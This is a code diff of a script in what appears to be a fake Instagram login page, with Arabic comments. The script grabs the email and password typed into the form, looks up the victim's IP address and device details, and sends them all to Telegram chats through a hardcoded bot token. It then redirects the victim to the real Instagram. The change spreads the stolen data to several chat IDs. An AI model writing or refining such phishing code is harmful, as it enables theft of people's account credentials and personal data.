@@ -77,53 +77,61 @@
 </body>
 </html>
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<script>
-    const TOKEN = "7070628074:AAFOfVQ5wYkIoU4n_g5YVE1XGVfuguiYXTg";                                                            // هنا التوكين
-    const CHAT_ID = "5618966875";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7070628074:AAFOfVQ5wYkIoU4n_g5YVE1XGVfuguiYXTg"; // هنا التوكين
+        const CHAT_IDS = ["5618966875", "6152638465"]; // أضف جميع معرفات الشات هنا
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault();
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-        axios.get('https://api.ipify.org?format=json')
-            .then(response => {
-                const ip = response.data.ip;
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
 
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-                const message = `
-                    <b>New Login Attempt</b>\n
-                    <b>Email:</b> ${email}\n
-                    <b>Password:</b> ${password}\n
-                    <b>IP Address:</b> ${ip}\n
-                    <b>Device Type:</b> ${deviceType}\n
-                    <b>Platform:</b> ${platform}\n
-                    <b>User Agent:</b> ${userAgent}\n
-                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
-                `;
+                    const message = `
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
 
-                axios.post(URI_API, {
-                    chat_id: CHAT_ID,
-                    parse_mode: 'html',
-                    text: message
-                }).then(response => {
-                 window.location.href = 'https://www.instagram.com/?hl=fr'
-                }).catch(error => {
-                    alert('Error sending the information. Please try again.');
+                    // إرسال الرسالة إلى جميع معرفات الدردشة
+                    CHAT_IDS.forEach(chatId => {
+                        axios.post(URI_API, {
+                            chat_id: chatId,
+                            parse_mode: 'html',
+                            text: message
+                        }).then(response => {
+                            console.log(`Message sent to chat ID: ${chatId}`);
+                        }).catch(error => {
+                            console.error(`Error sending to chat ID: ${chatId}`, error);
+                        });
+                    });
+
+                    // إعادة التوجيه بعد إرسال الرسائل
+                    window.location.href = 'https://www.instagram.com/?hl=fr';
+                })
+                .catch(error => {
+                    alert('Error fetching the IP address. Please try again.');
                 });
-            })
-            .catch(error => {
-                alert('Error fetching the IP address. Please try again.');
-            });
-    });
-</script>
+        });
+    </script>
+
 
 </body>
 </html>
